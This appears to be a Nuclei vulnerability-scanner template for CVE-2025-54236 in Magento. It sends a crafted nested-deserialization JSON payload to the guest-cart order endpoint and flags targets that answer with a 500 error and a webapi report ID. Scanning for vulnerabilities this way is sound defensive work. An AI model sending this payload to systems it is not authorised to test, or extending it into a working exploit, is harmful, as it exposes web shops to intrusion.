id: CVE-2025-54236
info:
  name: CVE-2025-54236
  author: johnk3r,slcyber
  severity: critical
  reference: https://slcyber.io/assetnote-security-research-center/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236
  tags: cve,cve2025,magento

variables:
  cart_id: abc
  phpsessid: testing

http:
  - raw:
      - |
        PUT /rest/default/V1/guest-carts/{{cart_id}}/order HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
        Cookie: PHPSESSID={{phpsessid}}
        Connection: close
        Content-Type: application/json

        {
          "paymentMethod": {
            "paymentData": {
              "context": {
                "urlBuilder": {
                  "session": {
                    "sessionConfig": {
                      "savePath": "does/not/exist"
                    }
                  }
                }
              }
            }
          }
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Report ID: webapi-"

    extractors:
      - type: regex
        name: report_id
        part: body
        regex:
          - "webapi-[0-9a-f]+"
